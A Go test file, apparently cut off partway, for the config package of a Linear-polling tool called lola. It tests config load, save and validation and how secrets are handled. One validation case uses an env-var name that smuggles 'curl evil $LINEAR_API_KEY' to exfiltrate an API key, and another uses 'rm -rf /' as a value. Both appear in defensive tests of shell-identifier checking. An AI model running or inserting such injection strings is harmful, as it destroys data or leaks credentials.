package config

import (
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/sushidev-team/lola/internal/notify"
)

func validPoll() Poll {
	return Poll{
		Name:           "frontend",
		Enabled:        true,
		TeamID:         "team-uuid",
		ProjectID:      "proj-uuid",
		CycleMode:      "active",
		StateIDs:       []string{"state-1", "state-2"},
		MatchLabels:    []string{"label-1"},
		MatchMode:      "any",
		AssigneeMode:   "me",
		Project:        "nori-app",
		Repo:           "sushidev-team/nori-app",
		ConcurrencyCap: 2,
		PrioritySort:   []string{"priority", "createdAt"},
		DedupMode:      "label",
		OnSentSetLabel: "label-sent",
	}
}

func validProject() Project {
	return Project{
		Name:          "nori-app",
		Path:          "/Volumes/Git/sushi/internal/nori/nori-app",
		Repo:          "sushidev-team/nori-app",
		DefaultBranch: "main",
		PostCreate:    []string{"composer install", "bun install --frozen-lockfile"},
		Symlinks:      []string{".env"},
		Env:           map[string]string{"APP_ENV": "local", "CI": "1"},
	}
}

// secondPoll is a second valid poll (distinct name) referencing validProject(),
// used by the round-trip test.
func secondPoll() Poll {
	p := validPoll()
	p.Name = "native-poll"
	return p
}

func TestHomeEnvOverride(t *testing.T) {
	t.Setenv("LOLA_HOME", "/tmp/lola-test-home")
	h, err := Home()
	if err != nil {
		t.Fatal(err)
	}
	if h != "/tmp/lola-test-home" {
		t.Fatalf("Home() = %q, want LOLA_HOME override", h)
	}

	p, err := DefaultPath()
	if err != nil {
		t.Fatal(err)
	}
	if p != filepath.Join("/tmp/lola-test-home", "config.toml") {
		t.Fatalf("DefaultPath() = %q", p)
	}

	t.Setenv("LOLA_HOME", "")
	h, err = Home()
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasSuffix(h, string(filepath.Separator)+".lola") {
		t.Fatalf("Home() without LOLA_HOME = %q, want ~/.lola", h)
	}
}

func TestLoadMissingFileGivesDefaults(t *testing.T) {
	c, err := Load(filepath.Join(t.TempDir(), "nope", "config.toml"))
	if err != nil {
		t.Fatalf("missing file must not error, got %v", err)
	}
	if c.Linear.Endpoint != DefaultEndpoint {
		t.Errorf("endpoint = %q", c.Linear.Endpoint)
	}
	if c.Defaults.PollInterval != DefaultPollInterval {
		t.Errorf("poll interval = %v", c.Defaults.PollInterval)
	}
}

func TestSaveLoadRoundTrip(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "sub", "config.toml")

	orig := &Config{}
	orig.Defaults.PollInterval = 90 * time.Second
	orig.Defaults.ConcurrencyCap = 3
	orig.Defaults.GlobalCap = 5
	orig.Linear = LinearConfig{APIKeyKeychain: "lola-linear", APIKeyEnv: "LINEAR_API_KEY", Endpoint: DefaultEndpoint}
	orig.Projects = []Project{validProject()}
	orig.Polls = []Poll{validPoll(), secondPoll()}
	// Resolved reaction/notify tables round-trip exactly; a load always
	// materializes them, so a round-tripped config carries the defaults.
	orig.Reactions = defaultReactions()
	orig.Notify = defaultNotify()

	if err := orig.Save(path); err != nil {
		t.Fatal(err)
	}

	info, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	if info.Mode().Perm() != 0o600 {
		t.Errorf("config mode = %v, want 0600", info.Mode().Perm())
	}
	dirInfo, err := os.Stat(filepath.Dir(path))
	if err != nil {
		t.Fatal(err)
	}
	if dirInfo.Mode().Perm() != 0o700 {
		t.Errorf("dir mode = %v, want 0700", dirInfo.Mode().Perm())
	}

	got, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(orig, got) {
		t.Errorf("round trip mismatch:\n save: %+v\n load: %+v", orig, got)
	}

	// No leftover temp files from the atomic write.
	entries, err := os.ReadDir(filepath.Dir(path))
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 1 {
		t.Errorf("expected only config.toml in dir, got %d entries", len(entries))
	}
}

func TestLoadClampAndEndpointDefault(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	body := `
[defaults]
poll_interval = "10s"
concurrency_cap = 1
global_cap = 4
`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	c, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if c.Defaults.PollInterval != MinPollInterval {
		t.Errorf("poll interval = %v, want clamped %v", c.Defaults.PollInterval, MinPollInterval)
	}
	if c.Linear.Endpoint != DefaultEndpoint {
		t.Errorf("endpoint = %q, want default", c.Linear.Endpoint)
	}
}

// Projects get default_branch = "main" and a tilde-expanded path on load. Keys
// from the AO-bridge era (per-poll `runtime` / `ao_project`) are silently
// ignored so pre-migration configs still load; the `project` reference remains.
func TestLoadProjectDefaultsAndLegacyKeysIgnored(t *testing.T) {
	home, err := os.UserHomeDir()
	if err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(t.TempDir(), "config.toml")
	body := `
[[project]]
name = "nori-app"
path = "~/code/nori-app"

[[project]]
name = "pinned"
path = "/srv/pinned"
default_branch = "develop"

[[poll]]
name = "legacy-poll"
runtime = "ao"
ao_project = "frontend"

[[poll]]
name = "native-poll"
runtime = "native"
project = "nori-app"
`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	c, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}

	if want := filepath.Join(home, "code", "nori-app"); c.Projects[0].Path != want {
		t.Errorf("project path = %q, want expanded %q", c.Projects[0].Path, want)
	}
	if c.Projects[0].DefaultBranch != DefaultBranchName {
		t.Errorf("default_branch = %q, want default %q", c.Projects[0].DefaultBranch, DefaultBranchName)
	}
	if c.Projects[1].DefaultBranch != "develop" {
		t.Errorf("explicit default_branch = %q, want develop", c.Projects[1].DefaultBranch)
	}
	if c.Polls[1].Project != "nori-app" {
		t.Errorf("poll project = %q, want nori-app", c.Polls[1].Project)
	}
}

// The projects table round-trips including post_create, symlinks, and the
// env map — nested tables under [[project]] must survive Save/Load.
func TestProjectRoundTripEnvMap(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	orig := &Config{}
	orig.applyDefaults()
	orig.Projects = []Project{validProject()}
	if err := orig.Save(path); err != nil {
		t.Fatal(err)
	}
	got, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(orig.Projects, got.Projects) {
		t.Errorf("projects round trip mismatch:\n save: %+v\n load: %+v", orig.Projects, got.Projects)
	}
}

func TestLoadPollIntervalClampBoundaries(t *testing.T) {
	cases := []struct {
		name string
		toml string // poll_interval line, or "" for unset
		want time.Duration
	}{
		{"below min clamps up", `poll_interval = "10s"`, MinPollInterval},
		{"exactly min unchanged", `poll_interval = "30s"`, MinPollInterval},
		{"above min unchanged", `poll_interval = "45s"`, 45 * time.Second},
		{"negative clamps up", `poll_interval = "-5s"`, MinPollInterval},
		{"unset gets default", ``, DefaultPollInterval},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			path := filepath.Join(t.TempDir(), "config.toml")
			body := "[defaults]\n" + tc.toml + "\n"
			if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
				t.Fatal(err)
			}
			c, err := Load(path)
			if err != nil {
				t.Fatal(err)
			}
			if c.Defaults.PollInterval != tc.want {
				t.Errorf("poll interval = %v, want %v", c.Defaults.PollInterval, tc.want)
			}
		})
	}
}

func TestLoadRejectsMalformedFile(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")

	if err := os.WriteFile(path, []byte("[defaults\nnot toml"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := Load(path); err == nil {
		t.Error("malformed TOML must error")
	} else if !strings.Contains(err.Error(), path) {
		t.Errorf("parse error should name the file, got: %v", err)
	}

	if err := os.WriteFile(path, []byte("[defaults]\npoll_interval = \"soon\"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := Load(path); err == nil {
		t.Error("unparseable poll_interval must error")
	}
}

func TestSaveDurationFormatOnDisk(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	c := &Config{}
	c.Defaults.PollInterval = 90 * time.Second
	if err := c.Save(path); err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	// On disk the interval is a Go duration string, not an integer.
	if !strings.Contains(string(data), `poll_interval = "1m30s"`) {
		t.Errorf("saved file should contain poll_interval = \"1m30s\", got:\n%s", data)
	}
}

func TestSaveOverwriteKeepsModeAndContent(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")

	c1 := &Config{}
	c1.Defaults.GlobalCap = 1
	if err := c1.Save(path); err != nil {
		t.Fatal(err)
	}

	c2 := &Config{}
	c2.Defaults.GlobalCap = 9
	if err := c2.Save(path); err != nil {
		t.Fatal(err)
	}

	info, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	if info.Mode().Perm() != 0o600 {
		t.Errorf("mode after overwrite = %v, want 0600", info.Mode().Perm())
	}
	got, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if got.Defaults.GlobalCap != 9 {
		t.Errorf("global_cap = %d, want overwritten value 9", got.Defaults.GlobalCap)
	}
	entries, err := os.ReadDir(filepath.Dir(path))
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 1 {
		t.Errorf("temp files left behind after overwrite: %d entries", len(entries))
	}
}

func TestValidate(t *testing.T) {
	c := &Config{}
	c.Defaults.GlobalCap = 4
	c.Projects = []Project{validProject()}
	c.Polls = []Poll{validPoll()}
	if err := c.Validate(); err != nil {
		t.Fatalf("valid config rejected: %v", err)
	}

	// Fallback cap from defaults.
	c.Polls[0].ConcurrencyCap = 0
	c.Defaults.ConcurrencyCap = 2
	if err := c.Validate(); err != nil {
		t.Fatalf("defaults.concurrency_cap fallback rejected: %v", err)
	}
	if got := c.EffectiveCap(&c.Polls[0]); got != 2 {
		t.Errorf("EffectiveCap = %d, want 2", got)
	}

	bad := &Config{}
	bad.Polls = []Poll{
		{Name: "", CycleMode: "pinned", MatchMode: "some", AssigneeMode: "user", DedupMode: "label"},
		{Name: "dup", TeamID: "t", CycleMode: "none", MatchMode: "all", AssigneeMode: "anyone", DedupMode: "seen", ConcurrencyCap: 1},
		{Name: "dup", TeamID: "t", CycleMode: "none", MatchMode: "all", AssigneeMode: "anyone", DedupMode: "seen", ConcurrencyCap: 1},
	}
	err := bad.Validate()
	if err == nil {
		t.Fatal("invalid config accepted")
	}
	msg := err.Error()
	for _, want := range []string{
		"global_cap",
		"name is required",
		"team_id is required",
		"cycle_mode=pinned requires cycle_id",
		"match_mode",
		"assignee_mode=user requires assignee_user_id",
		"project is required",
		"on_sent_set_label",
		"concurrency_cap",
		"duplicate name",
	} {
		if !strings.Contains(msg, want) {
			t.Errorf("Validate() error missing %q in:\n%s", want, msg)
		}
	}
}

// TestValidateMatrix exercises every Validate rule in isolation: each case
// mutates one aspect of a known-good config and asserts the specific error
// (or that the config remains valid).
func TestValidateMatrix(t *testing.T) {
	valid := func() *Config {
		c := &Config{}
		c.Defaults.GlobalCap = 4
		c.Projects = []Project{validProject()}
		c.Polls = []Poll{validPoll()}
		return c
	}

	cases := []struct {
		name    string
		mutate  func(c *Config)
		wantErr string // substring of Validate() error; "" = must be valid
	}{
		{"valid config passes", func(c *Config) {}, ""},
		{"no polls still needs global cap", func(c *Config) { c.Polls = nil; c.Defaults.GlobalCap = 0 }, "global_cap"},
		{"global cap zero", func(c *Config) { c.Defaults.GlobalCap = 0 }, "global_cap"},
		{"global cap negative", func(c *Config) { c.Defaults.GlobalCap = -1 }, "global_cap"},

		{"name required", func(c *Config) { c.Polls[0].Name = "" }, "name is required"},
		{"duplicate names rejected", func(c *Config) { c.Polls = append(c.Polls, c.Polls[0]) }, "duplicate name"},
		{"team required", func(c *Config) { c.Polls[0].TeamID = "" }, "team_id is required"},

		{"cycle_mode none ok", func(c *Config) { c.Polls[0].CycleMode = "none" }, ""},
		{"cycle_mode active ok", func(c *Config) { c.Polls[0].CycleMode = "active" }, ""},
		{"pinned requires cycle_id", func(c *Config) { c.Polls[0].CycleMode = "pinned"; c.Polls[0].CycleID = "" }, "cycle_mode=pinned requires cycle_id"},
		{"pinned with cycle_id ok", func(c *Config) { c.Polls[0].CycleMode = "pinned"; c.Polls[0].CycleID = "cyc-1" }, ""},
		{"bad cycle_mode enum", func(c *Config) { c.Polls[0].CycleMode = "weekly" }, "cycle_mode"},
		{"empty cycle_mode rejected", func(c *Config) { c.Polls[0].CycleMode = "" }, "cycle_mode"},

		{"match_mode any ok", func(c *Config) { c.Polls[0].MatchMode = "any" }, ""},
		{"match_mode all ok", func(c *Config) { c.Polls[0].MatchMode = "all" }, ""},
		{"bad match_mode enum", func(c *Config) { c.Polls[0].MatchMode = "some" }, "match_mode"},
		{"empty match_mode rejected", func(c *Config) { c.Polls[0].MatchMode = "" }, "match_mode"},

		{"assignee anyone ok", func(c *Config) { c.Polls[0].AssigneeMode = "anyone" }, ""},
		{"assignee user requires id", func(c *Config) { c.Polls[0].AssigneeMode = "user"; c.Polls[0].AssigneeUserID = "" }, "assignee_mode=user requires assignee_user_id"},
		{"assignee user with id ok", func(c *Config) { c.Polls[0].AssigneeMode = "user"; c.Polls[0].AssigneeUserID = "u-1" }, ""},
		{"bad assignee_mode enum", func(c *Config) { c.Polls[0].AssigneeMode = "nobody" }, "assignee_mode"},
		{"empty assignee_mode rejected", func(c *Config) { c.Polls[0].AssigneeMode = "" }, "assignee_mode"},

		{"repo empty ok (falls back to project repo)", func(c *Config) { c.Polls[0].Repo = "" }, ""},
		{"repo owner/name ok", func(c *Config) { c.Polls[0].Repo = "sushidev-team/nori-app" }, ""},
		{"repo dots underscores dashes ok", func(c *Config) { c.Polls[0].Repo = "My-Org.x/repo_name.js" }, ""},
		{"repo without owner rejected", func(c *Config) { c.Polls[0].Repo = "nori-app" }, `repo must be "owner/name"`},
		{"repo url rejected", func(c *Config) { c.Polls[0].Repo = "https://github.com/sushidev-team/nori-app" }, `repo must be "owner/name"`},
		{"repo extra path segment rejected", func(c *Config) { c.Polls[0].Repo = "a/b/c" }, `repo must be "owner/name"`},
		{"repo embedded space rejected", func(c *Config) { c.Polls[0].Repo = "owner/na me" }, `repo must be "owner/name"`},

		{"label mode needs set label", func(c *Config) { c.Polls[0].OnSentSetLabel = "" }, "on_sent_set_label"},
		{"label mode needs match labels", func(c *Config) { c.Polls[0].MatchLabels = nil }, "requires match_labels"},
		{"label mode set label must not be a match label", func(c *Config) {
			c.Polls[0].OnSentSetLabel = "label-1"
		}, "on_sent_set_label must not be one of match_labels"},
		{"label mode any with multiple match labels ok", func(c *Config) {
			c.Polls[0].MatchMode = "any"
			c.Polls[0].MatchLabels = []string{"label-1", "label-2"}
		}, ""},
		{"label mode all with multiple match labels ok", func(c *Config) {
			c.Polls[0].MatchMode = "all"
			c.Polls[0].MatchLabels = []string{"label-1", "label-2"}
		}, ""},
		{"seen mode multiple any labels ok", func(c *Config) {
			c.Polls[0].DedupMode = "seen"
			c.Polls[0].OnSentSetLabel = ""
			c.Polls[0].MatchMode = "any"
			c.Polls[0].MatchLabels = []string{"label-1", "label-2"}
		}, ""},
		{"seen mode needs no labels", func(c *Config) {
			c.Polls[0].DedupMode = "seen"
			c.Polls[0].OnSentSetLabel = ""
		}, ""},
		{"bad dedup_mode enum", func(c *Config) { c.Polls[0].DedupMode = "both" }, "dedup_mode"},
		{"empty dedup_mode rejected", func(c *Config) { c.Polls[0].DedupMode = "" }, "dedup_mode"},

		{"cap zero without default", func(c *Config) { c.Polls[0].ConcurrencyCap = 0 }, "concurrency_cap"},
		{"cap negative without default", func(c *Config) { c.Polls[0].ConcurrencyCap = -2 }, "concurrency_cap"},
		{"cap zero with default ok", func(c *Config) { c.Polls[0].ConcurrencyCap = 0; c.Defaults.ConcurrencyCap = 2 }, ""},

		{"project valid ok", func(c *Config) { c.Projects = []Project{validProject()} }, ""},
		{"project name required", func(c *Config) {
			p := validProject()
			p.Name = ""
			c.Projects = []Project{p}
		}, "project[0]: name is required"},
		{"duplicate project names rejected", func(c *Config) {
			c.Projects = []Project{validProject(), validProject()}
		}, `project "nori-app": duplicate name`},
		{"project path required", func(c *Config) {
			p := validProject()
			p.Path = ""
			c.Projects = []Project{p}
		}, "path is required"},
		{"project repo empty ok", func(c *Config) {
			p := validProject()
			p.Repo = ""
			c.Projects = []Project{p}
		}, ""},
		{"project repo url rejected", func(c *Config) {
			p := validProject()
			p.Repo = "https://github.com/sushidev-team/nori-app"
			c.Projects = []Project{p}
		}, `project "nori-app": repo must be "owner/name"`},
		{"project validated even with zero polls", func(c *Config) {
			c.Polls = nil
			p := validProject()
			p.Path = ""
			c.Projects = []Project{p}
		}, "path is required"},

		// env keys become NAME= assignments in a shell-sourced file at spawn
		// time, so they must be POSIX shell identifiers — a name carrying shell
		// metacharacters is a Linear-API-key exfiltration vector.
		{"project env plain identifier ok", func(c *Config) {
			p := validProject()
			p.Env = map[string]string{"APP_ENV": "local"}
			c.Projects = []Project{p}
		}, ""},
		{"project env value may hold anything", func(c *Config) {
			p := validProject()
			p.Env = map[string]string{"APP_ENV": "a; rm -rf / $X"}
			c.Projects = []Project{p}
		}, ""},
		{"project env name with shell metachars rejected", func(c *Config) {
			p := validProject()
			p.Env = map[string]string{"z=1; curl evil $LINEAR_API_KEY #": "x"}
			c.Projects = []Project{p}
		}, "is not a valid shell identifier"},
		{"project env name starting with digit rejected", func(c *Config) {
			p := validProject()
			p.Env = map[string]string{"1BAD": "x"}
			c.Projects = []Project{p}
		}, "is not a valid shell identifier"},
		{"project env name with dash rejected", func(c *Config) {
			p := validProject()
			p.Env = map[string]string{"has-dash": "x"}
			c.Projects = []Project{p}
		}, "is not a valid shell identifier"},

		// Every poll must reference a defined [[project]].
		{"poll project required", func(c *Config) { c.Polls[0].Project = "" }, "project is required"},
		{"poll project must resolve", func(c *Config) { c.Polls[0].Project = "ghost" }, `project "ghost" is not defined`},
		{"poll project resolves ok", func(c *Config) { c.Polls[0].Project = "nori-app" }, ""},
		{"poll project without any projects rejected", func(c *Config) {
			c.Projects = nil
		}, `project "nori-app" is not defined`},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			c := valid()
			tc.mutate(c)
			err := c.Validate()
			if tc.wantErr == "" {
				if err != nil {
					t.Fatalf("want valid, got: %v", err)
				}
				return
			}
			if err == nil {
				t.Fatalf("want error containing %q, got nil", tc.wantErr)
			}
			if !strings.Contains(err.Error(), tc.wantErr) {
				t.Fatalf("error missing %q:\n%v", tc.wantErr, err)
			}
		})
	}
}

func TestEffectiveCapFallback(t *testing.T) {
	c := &Config{}
	c.Defaults.ConcurrencyCap = 3

	p := validPoll()
	p.ConcurrencyCap = 5
	if got := c.EffectiveCap(&p); got != 5 {
		t.Errorf("poll cap set: EffectiveCap = %d, want 5", got)
	}

	p.ConcurrencyCap = 0
	if got := c.EffectiveCap(&p); got != 3 {
		t.Errorf("poll cap unset: EffectiveCap = %d, want defaults fallback 3", got)
	}

	// Negative poll caps are not a valid override; fall back to defaults.
	p.ConcurrencyCap = -1
	if got := c.EffectiveCap(&p); got != 3 {
		t.Errorf("poll cap negative: EffectiveCap = %d, want defaults fallback 3", got)
	}

	if got := c.EffectiveCap(nil); got != 3 {
		t.Errorf("nil poll: EffectiveCap = %d, want defaults fallback 3", got)
	}
}

// PollRepo resolves the PR-check repo: the poll's own repo wins, else the
// referenced [[project]]'s repo, else empty.
func TestPollRepo(t *testing.T) {
	c := &Config{Projects: []Project{{Name: "nori-app", Repo: "sushidev-team/nori-app"}}}

	p := Poll{Project: "nori-app", Repo: "acme/widgets"}
	if got := c.PollRepo(&p); got != "acme/widgets" {
		t.Errorf("PollRepo = %q, want the poll's own repo", got)
	}

	p.Repo = "" // falls back to the project's repo
	if got := c.PollRepo(&p); got != "sushidev-team/nori-app" {
		t.Errorf("PollRepo = %q, want the project's repo fallback", got)
	}

	p.Project = "ghost" // unknown project, no poll repo
	if got := c.PollRepo(&p); got != "" {
		t.Errorf("PollRepo = %q, want empty", got)
	}

	if got := c.PollRepo(nil); got != "" {
		t.Errorf("PollRepo(nil) = %q, want empty", got)
	}
}

func TestPollByName(t *testing.T) {
	c := &Config{Polls: []Poll{validPoll()}}
	p := c.PollByName("frontend")
	if p == nil {
		t.Fatal("PollByName returned nil for existing poll")
	}
	p.Enabled = false
	if c.Polls[0].Enabled {
		t.Error("PollByName must return a pointer into Polls")
	}
	if c.PollByName("missing") != nil {
		t.Error("PollByName must return nil for unknown name")
	}
}

func TestProjectByName(t *testing.T) {
	c := &Config{Projects: []Project{validProject()}}
	p := c.ProjectByName("nori-app")
	if p == nil {
		t.Fatal("ProjectByName returned nil for existing project")
	}
	p.DefaultBranch = "develop"
	if c.Projects[0].DefaultBranch != "develop" {
		t.Error("ProjectByName must return a pointer into Projects")
	}
	if c.ProjectByName("missing") != nil {
		t.Error("ProjectByName must return nil for unknown name")
	}
}

// The shipped example config must always load and validate cleanly, and every
// poll references a [[project]] (the native runtime's registry).
func TestExampleConfigLoadsAndValidates(t *testing.T) {
	c, err := Load(filepath.Join("..", "..", "config.example.toml"))
	if err != nil {
		t.Fatal(err)
	}
	if err := c.Validate(); err != nil {
		t.Errorf("config.example.toml does not validate: %v", err)
	}
	if c.ProjectByName("nori-app") == nil {
		t.Error("example config should define project nori-app")
	}
	for _, p := range c.Polls {
		if p.Project == "" {
			t.Errorf("poll %q must reference a [[project]]", p.Name)
		}
	}
}

// When neither [reactions] nor [notify] is present, load materializes the full
// defaults — existing configs keep working, now with a reaction/notify policy.
func TestReactionsNotifyDefaultsWhenTablesAbsent(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	body := "[defaults]\nglobal_cap = 4\n"
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	c, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(c.Reactions, defaultReactions()) {
		t.Errorf("reactions = %+v, want defaults %+v", c.Reactions, defaultReactions())
	}
	if c.Notify.Desktop != defaultDesktop() {
		t.Errorf("notify.desktop = %v, want default %v", c.Notify.Desktop, defaultDesktop())
	}
	if c.Notify.SlackWebhookEnv != DefaultSlackWebhookEnv {
		t.Errorf("notify.slack_webhook_env = %q, want %q", c.Notify.SlackWebhookEnv, DefaultSlackWebhookEnv)
	}
	if !reflect.DeepEqual(c.Notify.Routing, defaultRouting()) {
		t.Errorf("notify.routing = %v, want default %v", c.Notify.Routing, defaultRouting())
	}
	if err := c.Validate(); err != nil {
		t.Errorf("defaulted reactions/notify must validate: %v", err)
	}
}

// Explicitly-set reaction fields — including the disabling zeros auto=false and
// retries=0 — survive load; unset reactions/priorities still take defaults.
func TestReactionsNotifyExplicitValuesKept(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	body := `
[defaults]
global_cap = 4

[reactions.ci_failed]
auto = false
retries = 0
message = "hand-rolled recovery"

[reactions.merged]
auto = false

[notify]
desktop = false
slack_webhook_env = "MY_HOOK"

[notify.routing]
urgent = ["slack"]
`
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	c, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}

	// ci_failed: every field explicit — the disabling zeros must NOT revert to
	// the {auto:true, retries:2} defaults.
	if got, want := c.Reactions.CIFailed, (Reaction{Auto: false, Retries: 0, Message: "hand-rolled recovery"}); got != want {
		t.Errorf("ci_failed = %+v, want %+v (explicit zeros kept)", got, want)
	}
	// merged: only auto set explicitly to false; the rest stays default.
	if got, want := c.Reactions.Merged, (Reaction{Auto: false}); got != want {
		t.Errorf("merged = %+v, want %+v", got, want)
	}
	// changes_requested: table absent → full default.
	if got, want := c.Reactions.ChangesRequested, defaultReactions().ChangesRequested; got != want {
		t.Errorf("changes_requested = %+v, want default %+v", got, want)
	}

	if c.Notify.Desktop {
		t.Error("notify.desktop = true, want explicit false kept (even where default is true)")
	}
	if c.Notify.SlackWebhookEnv != "MY_HOOK" {
		t.Errorf("notify.slack_webhook_env = %q, want MY_HOOK", c.Notify.SlackWebhookEnv)
	}
	if got := c.Notify.Routing["urgent"]; !reflect.DeepEqual(got, []string{"slack"}) {
		t.Errorf("routing.urgent = %v, want overridden [slack]", got)
	}
	// Priorities not named keep their defaults.
	if got := c.Notify.Routing["action"]; !reflect.DeepEqual(got, []string{"desktop", "slack"}) {
		t.Errorf("routing.action = %v, want default [desktop slack]", got)
	}
	if got := c.Notify.Routing["info"]; !reflect.DeepEqual(got, []string{"slack"}) {
		t.Errorf("routing.info = %v, want default [slack]", got)
	}
	if err := c.Validate(); err != nil {
		t.Errorf("explicit reactions/notify must validate: %v", err)
	}
}

// Custom reaction/notify values round-trip through Save/Load unchanged.
func TestReactionsNotifyCustomRoundTrip(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	orig := &Config{}
	orig.Defaults.GlobalCap = 4
	orig.Reactions = defaultReactions()
	orig.Reactions.CIFailed = Reaction{Auto: false, Retries: 5, Message: "fix it"}
	orig.Notify = defaultNotify()
	orig.Notify.Desktop = false
	orig.Notify.SlackWebhookEnv = "HOOK_ENV"
	orig.Notify.Routing["info"] = []string{"desktop"}

	if err := orig.Save(path); err != nil {
		t.Fatal(err)
	}
	got, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(orig.Reactions, got.Reactions) {
		t.Errorf("reactions round trip:\n save: %+v\n load: %+v", orig.Reactions, got.Reactions)
	}
	if !reflect.DeepEqual(orig.Notify, got.Notify) {
		t.Errorf("notify round trip:\n save: %+v\n load: %+v", orig.Notify, got.Notify)
	}
}

// A fresh &Config{} (the setup wizard's starting point) does NOT persist a
// disabled reaction/notify policy: the zero tables are omitted from disk and
// reload to full defaults.
func TestFreshConfigSaveReloadsDefaults(t *testing.T) {
	path := filepath.Join(t.TempDir(), "config.toml")
	if err := (&Config{}).Save(path); err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(data), "[reactions") || strings.Contains(string(data), "[notify") {
		t.Errorf("fresh config should omit reaction/notify tables, got:\n%s", data)
	}
	got, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(got.Reactions, defaultReactions()) {
		t.Errorf("reloaded reactions = %+v, want defaults", got.Reactions)
	}
	if !reflect.DeepEqual(got.Notify, defaultNotify()) {
		t.Errorf("reloaded notify = %+v, want defaults", got.Notify)
	}
}

// ResolveNotify reads the webhook URL from the named env var, maps the priority
// names to notify.Priority, and never surfaces the value in config or errors.
func TestResolveNotifyWebhookFromEnv(t *testing.T) {
	const secret = "https://hooks.slack.example/services/T00/B00/verysecretXYZ"

	c := &Config{}
	c.Notify = defaultNotify()
	c.Notify.SlackWebhookEnv = "LOLA_TEST_HOOK"

	t.Setenv("LOLA_TEST_HOOK", secret)
	nc := c.ResolveNotify()
	if nc.SlackWebhook != secret {
		t.Errorf("SlackWebhook = %q, want the env value", nc.SlackWebhook)
	}
	if nc.Desktop != c.Notify.Desktop {
		t.Errorf("Desktop = %v, want %v", nc.Desktop, c.Notify.Desktop)
	}
	if got := nc.Routing[notify.Urgent]; !reflect.DeepEqual(got, []string{"desktop", "slack"}) {
		t.Errorf("Routing[Urgent] = %v, want [desktop slack]", got)
	}
	if got := nc.Routing[notify.Info]; !reflect.DeepEqual(got, []string{"slack"}) {
		t.Errorf("Routing[Info] = %v, want [slack]", got)
	}

	// Unset env var → empty URL, never an error.
	c.Notify.SlackWebhookEnv = "LOLA_TEST_HOOK_DEFINITELY_UNSET"
	if got := c.ResolveNotify().SlackWebhook; got != "" {
		t.Errorf("SlackWebhook = %q, want empty when env unset", got)
	}
	// Empty env NAME → empty URL.
	c.Notify.SlackWebhookEnv = ""
	if got := c.ResolveNotify().SlackWebhook; got != "" {
		t.Errorf("SlackWebhook = %q, want empty when env name blank", got)
	}

	// The secret must never leak into the persisted config or a Validate error.
	// Only the env NAME is stored; the URL lives solely in the environment.
	c.Notify.SlackWebhookEnv = "LOLA_TEST_HOOK"
	c.Notify.Routing["urgent"] = []string{"pager"} // force a validation error
	path := filepath.Join(t.TempDir(), "config.toml")
	if err := c.Save(path); err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(data), secret) {
		t.Error("saved config.toml must never contain the resolved webhook URL")
	}
	if !strings.Contains(string(data), "LOLA_TEST_HOOK") {
		t.Error("saved config.toml should store the env var NAME")
	}
	if err := c.Validate(); err == nil {
		t.Error("invalid channel should fail validation")
	} else if strings.Contains(err.Error(), secret) {
		t.Error("Validate error must never contain the webhook value")
	}
}

// [notify.routing] validation: priority keys ∈ {urgent,action,info};
// channels ∈ {desktop,slack}. [reactions] retries must be >= 0.
func TestReactionsNotifyValidation(t *testing.T) {
	base := func() *Config {
		c := &Config{}
		c.Defaults.GlobalCap = 4
		c.Reactions = defaultReactions()
		c.Notify = defaultNotify()
		return c
	}

	cases := []struct {
		name    string
		mutate  func(c *Config)
		wantErr string // "" = must be valid
	}{
		{"defaults valid", func(c *Config) {}, ""},
		{"retries zero ok", func(c *Config) { c.Reactions.CIFailed.Retries = 0 }, ""},
		{"retries negative rejected", func(c *Config) { c.Reactions.CIFailed.Retries = -1 }, "reactions.ci_failed: retries must be >= 0"},
		{"retries negative on any reaction rejected", func(c *Config) { c.Reactions.Merged.Retries = -3 }, "reactions.merged: retries must be >= 0"},
		{"unknown priority rejected", func(c *Config) { c.Notify.Routing["critical"] = []string{"slack"} }, `unknown priority "critical"`},
		{"unknown channel rejected", func(c *Config) { c.Notify.Routing["urgent"] = []string{"pager"} }, `unknown channel "pager"`},
